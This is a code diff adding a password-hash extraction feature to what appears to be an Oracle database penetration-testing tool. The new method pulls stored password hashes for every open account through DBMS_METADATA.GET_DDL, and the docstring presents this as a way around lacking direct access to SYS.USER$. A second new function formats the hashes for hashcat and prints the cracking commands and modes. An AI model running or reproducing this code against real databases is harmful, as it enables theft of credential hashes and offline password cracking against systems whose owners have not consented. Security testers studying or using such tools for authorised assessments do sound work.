@@ -6,6 +6,7 @@ import logging
 from Constants import *
 from Info import Info
 from Utils import checkOptionsGivenByTheUser, generateRandomString, ErrorSQLRequest
+import re
 
 class Passwords (OracleDatabase):
 	'''
@@ -199,6 +200,48 @@ class Passwords (OracleDatabase):
 			error = ErrorSQLRequest("Get hashes with DBMS_STAT is only valid when Oracle Database >=11g? It is not the case here.")
 			return error, None, None
 
+	def getHashedPasswordsWithDbmsMetadata(self):
+		'''
+		DBMS_METADATA is an Oracle built-in package designed to export database object definitions as DDL SQL.
+		The same statements that would recreate the object from scratch. 
+		It's used by tools like expdp (Data Pump export) and Oracle SQL Developer.
+		When Oracle exports a user, the DDL must be able to recreate that user with the exact same password on another database. 
+		To do that, it uses the special IDENTIFIED BY VALUES clause, which takes the raw stored hash directly, bypassing any hashing step/
+		So GET_DDL internally reads SYS.USER$ as SYS (the package runs with definer rights, owned by SYS), 
+		extracts the stored hash, and embeds it in the DDL output. 
+		We receive the hash without ever directly querying SYS.USER$.
+		
+		This method can be very useful when you are DBA (but not SYSDBA) on Oracle 19 for example, and you can access to sys.user$ direcly, 
+		by missing permissions.
+		
+		Returns (no hash in DDL) for external users (IDENTIFIED EXTERNALLY) and global users (IDENTIFIED GLOBALLY): no local password stored.
+		
+		DBMS_METADATA.GET_DDL works from Oracle 9i to 23c
+		'''
+		creds=[]
+		logging.info("Trying to get hashes with DBMS_METADATA module...")
+		reqGetUsernamesNoLocked =  "SELECT username FROM dba_users WHERE account_status = 'OPEN' ORDER BY username"
+		reqGetHash = "SELECT DBMS_METADATA.GET_DDL('USER', '{0}') FROM dual"
+		results = self.__execQuery__(query=reqGetUsernamesNoLocked, ld=['username'])
+		if isinstance(results,Exception):
+			logging.warning("Impossible to get no locked Oracle accounts: {0}. Continue with empty list of account locked".format(results))
+			return False
+		for aUserDetail in results:
+			username = aUserDetail['username']
+			results = self.__execQuery__(query=reqGetHash.format(username), ld=['username'])
+			if isinstance(results,Exception):
+				logging.warning("Impossible to get hash for user {0}: {1}".format(username, results))
+			if len(results)>0 and 'username' in results[0]:
+				ddl = results[0]['username'].read()
+				m = re.search(r"IDENTIFIED BY VALUES '([^']+)'", ddl)
+				if m:
+					self.passwords.append({'username':username, 'password':m.group(1)})
+				else:
+					self.passwords.append({'username':username, 'password':"(no hash in DDL)"})
+			else:
+				logging.warning("Impossible to get hash for user {0}, no result")
+		return True
+			
 
 	def printPasswords (self):
 		'''
@@ -235,8 +278,62 @@ class Passwords (OracleDatabase):
 				if l['password']!=None : print("{0}:{1}".format(l['username'], l['password']))
 			elif 'user#' in l and 'password' in l and 'password_date' in l:
 				if l['password']!=None : print("{0}; {1}; {2}".format(l['user#'], l['password'], l['password_date']))
-		
-	def testAll (self):
+
+	def printHashcatHashesAndHelp(self):
+		'''
+		'''
+		return self._printHashcatHashes(self.passwords)
+
+	def _printHashcatHashes(self, users: list[dict]):
+		"""
+		Print hashcat-compatible lines for each Oracle verifier type.
+		S: (mode 112)    → USERNAME:hash40:salt20      (use hashcat --username)
+		T: (mode 12300)  → USERNAME:hash160             (use hashcat --username)
+		H: (mode 3100)   → hash16:USERNAME_UPPER        (username is the DES salt, no prefix)
+		users: list of {'username': str, 'password': str}
+					password format: 'S:hexhex;T:hexhex;H:hexhex' (any combination)
+		"""
+		s_lines: list[str] = []
+		t_lines: list[str] = []
+		h_lines: list[str] = []
+		for user in users:
+			username: str = user["username"]
+			password_field: str = user.get("password") or ""
+			for verifier in password_field.split(";"):
+				verifier = verifier.strip()
+				if verifier.startswith("S:"):
+					raw = verifier[2:]
+					if len(raw) == 60:
+						hash_part = raw[:40]
+						salt_part = raw[40:]
+						s_lines.append(f"{username}:{hash_part}:{salt_part}")
+					else:
+						s_lines.append(f"# WARN: unexpected S: length ({len(raw)}) for {username}")
+				elif verifier.startswith("T:"):
+					raw = verifier[2:]
+					t_lines.append(f"{username}:{raw}")
+				elif verifier.startswith("H:"):
+					raw = verifier[2:]
+					# H: uses the Oracle username (uppercase) as DES salt — already embedded
+					h_lines.append(f"{raw}:{username.upper()}")
+		if s_lines:
+			print("# -- Oracle SHA-1 (S:) -- mode 112 -- use: 'hashcat --username -m 112'")
+			for line in s_lines:
+				print(line)
+			print()
+		if t_lines:
+			print("# -- Oracle PBKDF2-SHA512 (T:) -- mode 12300 -- use: 'hashcat --username -m 12300'")
+			for line in t_lines:
+				print(line)
+			print()
+		if h_lines:
+			print("# -- Oracle DES (H:) -- mode 3100 -- use: 'hashcat -m 3100'")
+			for line in h_lines:
+				print(line)
+			print()
+
+			
+	def testAll(self):
 		'''
 		Test all functions
 		'''
@@ -254,6 +351,7 @@ class Passwords (OracleDatabase):
 				self.args['print'].goodNews("OK")
 			else:
 				self.args['print'].badNews("KO")
+			self.args['print'].subtitle("Hashed Oracle passwords with a view in DBMS_STAT?")
 			logging.info("Try to get Oracle hashed passwords via DBMS_STAT")
 			names, passwords, spare4 = self.getHashedPasswordsWithDBMS_STATS()
 			if isinstance(names, Exception):
@@ -267,13 +365,20 @@ class Passwords (OracleDatabase):
 			self.args['print'].goodNews("OK")
 		else : 
 			self.args['print'].badNews("KO")
+		self.args['print'].subtitle("Hashed Oracle passwords with DBMS_METADATA.GET_DDL ?")
+		logging.info("Try to get Oracle hashed passwords with DBMS_METADATA.GET_DDL")
+		status = self.getHashedPasswordsWithDbmsMetadata()
+		if status == True :
+			self.args['print'].goodNews("OK")
+		else : 
+			self.args['print'].badNews("KO")
 
 def runPasswordsModule(args):
 	'''
 	Run the Passwords module
 	'''
 	status = True
-	if checkOptionsGivenByTheUser(args,["test-module","get-passwords","get-passwords-ocm","get-passwords-from-history", "get-passwords-not-locked","get-passwords-ocm-not-locked","get-passwords-dbms-stats"]) == False : return EXIT_MISS_ARGUMENT
+	if checkOptionsGivenByTheUser(args,["test-module","get-passwords","get-passwords-ocm","get-passwords-from-history", "get-passwords-not-locked","get-passwords-ocm-not-locked","get-passwords-dbms-stats", "get-passwords-ddl"]) == False : return EXIT_MISS_ARGUMENT
 	passwords = Passwords(args)
 	status = passwords.connection(stopIfError=True)
 	if ('info' in args)==False:
@@ -357,5 +462,11 @@ def runPasswordsModule(args):
 			args['print'].goodNews("'spare4' column of sys.user$:")
 			for aR in spare4:
 				print(aR)
-
+	if args['get-passwords-ddl'] == True:
+		status = passwords.getHashedPasswordsWithDbmsMetadata()
+		if status == True :
+			args['print'].goodNews("Here are Oracle hashed passwords extracted with DBMS_METADATA.GET_DDL method")
+			passwords.printHashcatHashesAndHelp()
+		else : 
+			args['print'].badNews("Impossible to get hashed passwords with DBMS_METADATA.GET_DDL method: {0}".format(status))
 
